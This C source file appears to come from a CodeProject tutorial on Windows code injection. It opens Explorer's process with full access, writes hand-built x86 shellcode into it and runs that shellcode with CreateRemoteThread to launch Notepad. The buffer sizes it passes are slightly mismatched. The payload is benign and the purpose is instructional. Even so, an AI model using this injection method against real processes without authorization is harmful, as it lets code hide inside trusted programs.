/*
    Application:    Code Injection in Explorer
    Author:     @_RT
    Compiled on:    Feb 2014
    URL:http://www.codeproject.com/Tips/732044/Code-Injection-2
    We will see the different steps involved to perform a code injection into an already running process.
    Following are the quick steps through the process of injection.
    1.Get the API addresses that you will be calling from the injected code.
    2.Prepare shell code of your function that you want to get executed from the injected process.
    3.Get the process ID of the running process that you wish to inject into by enumerating through the
      list of processes or by finding the process's window (in case it's a GUI application) by class name or title.
    4.Open the process using its Pid with All Access rights.
    5.Allocate different memory spaces in the process that you are going to inject to with desired access
      rights for holding different segments of your shell code.
        Code part (executable instructions)
        Data part (strings, function parameters, etc.)
    6.Write the allocated memories with the respective values (code and data).
    7.Call CreateRemoteThread API and pass to it the start of allocated memory address where you have
      written your shell code from the process we are injecting.
*/

#include <windows.h>
#pragma comment(lib,"user32.lib")

LPVOID addr;
LPVOID addr2;

BOOL InjectExecutable(DWORD dwPid, LPVOID si, LPVOID pi, int sisize, int pisize)
{
    LPVOID hNewModule;
    HANDLE hProcess;
    CHAR S[] = { "C:\\Windows\\system32\\notepad.exe" };
    BYTE byt[] = { 0x6A, 0x00, 0x6A, 0x00, 0x6A, 0x00, 0x6A, 0x01, 0x6A, 0x00, 0x6A, 0x00, 0x6A, 0x00, 0x68 };
    //push  0   , push     0, push     0, push     1, push     0, push     0, push     0, push 0xXXXXXXXX
    BYTE byt2[] = { 0xE8 };//call 0xXXXXXXXX
    BYTE byt3[] = { 0x68 };//push 0xXXXXXXXX

    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);
    if (hProcess == NULL)
    {
        return FALSE;
    }

    LPVOID staddr = VirtualAllocEx(hProcess, NULL, sizeof(S), MEM_COMMIT, PAGE_READWRITE);
    WriteProcessMemory(hProcess, staddr, S, sizeof(S), NULL);
    LPVOID fnaddr = VirtualAllocEx(hProcess, NULL, 4, MEM_COMMIT, PAGE_READWRITE);
    WriteProcessMemory(hProcess, fnaddr, pi, sisize, NULL);
    LPVOID fnaddr2 = VirtualAllocEx(hProcess, NULL, 4, MEM_COMMIT, PAGE_READWRITE);
    WriteProcessMemory(hProcess, fnaddr2, si, pisize, NULL);

    hNewModule = VirtualAllocEx(hProcess, NULL, 100, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (hNewModule == NULL)
    {
        return FALSE;
    }
    LPTHREAD_START_ROUTINE strtaddr = (LPTHREAD_START_ROUTINE)hNewModule;

    WriteProcessMemory(hProcess, hNewModule, byt3, sizeof(byt3), NULL);
    hNewModule = (LPVOID)((int)hNewModule + sizeof(byt3));
    WriteProcessMemory(hProcess, hNewModule, &fnaddr, sizeof(fnaddr), NULL);
    hNewModule = (LPVOID)((int)hNewModule + sizeof(fnaddr));                    // push &pi ;lpProcessInformation
    WriteProcessMemory(hProcess, hNewModule, byt3, sizeof(byt3), NULL);
    hNewModule = (LPVOID)((int)hNewModule + sizeof(byt3));
    WriteProcessMemory(hProcess, hNewModule, &fnaddr2, sizeof(fnaddr2), NULL);
    hNewModule = (LPVOID)((int)hNewModule + sizeof(fnaddr2));                   // push &si ;lpStartupInfo
    WriteProcessMemory(hProcess, hNewModule, byt, sizeof(byt), NULL);           // push 0 , push 0, push 0, push 1, push 0, push 0, push 0, push 0xXXXXXXXX==&S[0];"C:\\Windows\\system32\\notepad.exe"
    hNewModule = (LPVOID)((int)hNewModule + sizeof(byt));                       // lpCurrentDirectory,lpEnvironment,dwCreationFlags,bInheritHandles,lpThreadAttributes,lpProcessAttributes,lpCommandLine,lpApplicationName
    WriteProcessMemory(hProcess, hNewModule, &staddr, sizeof(staddr), NULL);
    hNewModule = (LPVOID)((int)hNewModule + sizeof(staddr));
    WriteProcessMemory(hProcess, hNewModule, byt2, sizeof(byt2), NULL);
    hNewModule = (LPVOID)((int)hNewModule + sizeof(byt2));                      // call CreateProcessA
    addr = (LPVOID)((int)addr - ((int)hNewModule + 4));
    WriteProcessMemory(hProcess, hNewModule, &addr, sizeof(addr), NULL);
    hNewModule = (LPVOID)((int)hNewModule + sizeof(addr));
    WriteProcessMemory(hProcess, hNewModule, byt, 2, NULL);
    hNewModule = (LPVOID)((int)hNewModule + 2);                                 // push 0 ;DWORD dwExitCode   // exit code for this thread
    WriteProcessMemory(hProcess, hNewModule, byt2, sizeof(byt2), NULL);
    hNewModule = (LPVOID)((int)hNewModule + sizeof(byt2));                      // call ExitThread
    addr2 = (LPVOID)((int)addr2 - ((int)hNewModule + 4));
    WriteProcessMemory(hProcess, hNewModule, &addr2, sizeof(addr2), NULL);

    CreateRemoteThread(hProcess, 0, 0, strtaddr, NULL, 0, NULL);
    return TRUE;
}

int main()
{
    _STARTUPINFOA si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    DWORD dwPid;
    HMODULE ldlib = LoadLibraryA("Kernel32.dll");
    addr = GetProcAddress(ldlib, "CreateProcessA");
    addr2 = GetProcAddress(ldlib, "ExitThread");
    HWND hWnd1 = FindWindow(NULL, L"Program Manager");
    if (NULL == hWnd1) {
        return 1;
    }
    GetWindowThreadProcessId(hWnd1, &dwPid);

    InjectExecutable(dwPid, &si, &pi, sizeof(si), sizeof(pi));

    return 0;
}